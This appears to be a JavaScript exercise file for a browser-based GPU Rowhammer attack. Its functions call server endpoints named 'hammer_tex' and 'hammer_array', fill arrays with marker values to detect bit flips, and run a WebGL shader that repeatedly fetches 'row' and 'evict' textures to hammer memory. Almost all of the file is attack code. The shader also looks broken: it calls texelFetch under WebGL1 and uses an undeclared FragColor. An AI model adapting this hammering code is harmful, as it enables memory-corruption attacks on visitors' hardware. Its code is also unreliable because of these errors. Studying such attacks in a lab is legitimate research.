const INT_MARKER = 0x40414140
const FIRST_ELEM = 0x50515150


async function get_tex_data() {
    var result = await $.ajax({
        url: "get_tex_infos",
    })
    return JSON.parse(result)
}


async function hammer_tex(tex_id) {
    var result = await $.ajax({
        data: {"tex_id": tex_id},
        url: "hammer_tex",
    })
    // console.log(result)
    bit_flip = JSON.parse(result);
    return bit_flip;
}


// tex_id is the id of the texture where you previously found bit flips
async function hammer_array(tex_id) {
     var result = await $.ajax({
        data: {"tex_id": tex_id},
        url: "hammer_array",
    })
    
    return result;

}

// use this function if you use the simulator to initially fill the arrays before triggering the bit flips
// the first value is set to 0x50515150 to avoid getting matches for all the 0x40414140s.

function fill_arrays(arr, len) {
    for (var i = 0; i < len; i++) {
        arr[i] = INT_MARKER;
    }
    arr[0] = FIRST_ELEM;
}


async function main() {

    var canvas = document.getElementById('triangleCanvas');
    var gl = canvas.getContext('webgl');
    gl.viewport(0,0,canvas.width,canvas.height);
    var vertexShaderSource = `precision mediump float;
    uniform sampler2D row1;
    uniform sampler2D row2;
    uniform int border;
    //layout (location = 0) in vec3 threadD;
    uniform sampler2D evict1[9];
    uniform sampler2D evict2;
    uniform sampler2D evict3;
    uniform sampler2D evict4;
    uniform sampler2D evict5;
    uniform sampler2D evict6;
    uniform sampler2D evict7;
    uniform sampler2D evict8;
    uniform sampler2D evict9;
    uniform sampler2D evict10;
    uniform sampler2D evict11;
    uniform sampler2D evict12;
    uniform int j;
    uniform int k;
    vec4 val;
    void main(void){
    	//int id = int(threadD.x) % 4;
    	for(int i = 0; i < 1200000; i++){
    		
    		 val += texelFetch(row1, ivec2(j, k), 0); 
    		 val += texelFetch(row2, ivec2(j, k), 0) ;
    		 val += texelFetch(evict1[0], ivec2(j, k), 0) ;
    		 val += texelFetch(evict1[6], ivec2(j, k), 0) ;
    		 val += texelFetch(evict1[1], ivec2(j, k), 0) ;
    		 val += texelFetch(evict1[7], ivec2(j, k), 0) ;
    		 val += texelFetch(evict1[2], ivec2(j, k), 0) ;
    		 val += texelFetch(evict1[8], ivec2(j, k), 0) ;
    		 val += texelFetch(evict1[5], ivec2(j, k), 0) ;
    		 val += texelFetch(row1, ivec2(j,k+2), 0) ;
    		 val += texelFetch(row2, ivec2(j, k+2), 0) ;
    		 val += texelFetch(evict1[0], ivec2(j, k+2), 0) ;
    		 val += texelFetch(evict1[6], ivec2(j, k+2), 0) ;
    		 val += texelFetch(evict1[1], ivec2(j, k+2), 0) ;
    		 val += texelFetch(evict1[7], ivec2(j, k+2), 0) ;
    		 val += texelFetch(evict1[2], ivec2(j, k+2), 0) ;
    		 val += texelFetch(evict1[8], ivec2(j, k+2), 0) ;
    		 val += texelFetch(evict1[5], ivec2(j, k+2), 0) ;
    	}
    	gl_Position = val;
    }`;


    var fragmentShaderSource = `precision mediump float;
    void main(void){
    	FragColor = vec4(0., 0., 0., 1.);
    }`;
    var vertShader = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vertShader, vertexShaderSource);
    gl.compileShader(vertShader);
    var compiled = gl.getShaderParameter(vertShader, gl.COMPILE_STATUS);
    if(!compiled){
        var compilationLog = gl.getShaderInfoLog(vertShader);
        console.log('Shader compiler log: ' + compilationLog);
        //return;
    }
    
    var fragShader = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fragShader, fragmentShaderSource);
    gl.compileShader(fragShader);
    
    var compiled = gl.getShaderParameter(fragShader, gl.COMPILE_STATUS);
    if(!compiled){
        var compilationLog = gl.getShaderInfoLog(fragShader);
        console.log('Shader compiler log: ' + compilationLog);
        return;
    }
    var prog = gl.createProgram();
    gl.attachShader(prog, vertShader);
    gl.attachShader(prog, fragShader);
    gl.linkProgram(prog);
    gl.useProgram(prog);

    gl.clearColor(1, 0, 1, 1);
    gl.clear(gl.COLOR_BUFFER_BIT);

    // const vertexBuf = gl.createBuffer();
    // gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuf);
    // gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([ -0.5,0.5,0.0,  -0.5,-0.5,0.0,  0.5,-0.5,0.0 ]), gl.STATIC_DRAW);

    // const coord = gl.getAttribLocation(prog, "c");
    // gl.vertexAttribPointer(coord, 3, gl.FLOAT, false, 0, 0);
    // gl.enableVertexAttribArray(coord);

    gl.drawArrays(gl.TRIANGLES, 0, 3);


}

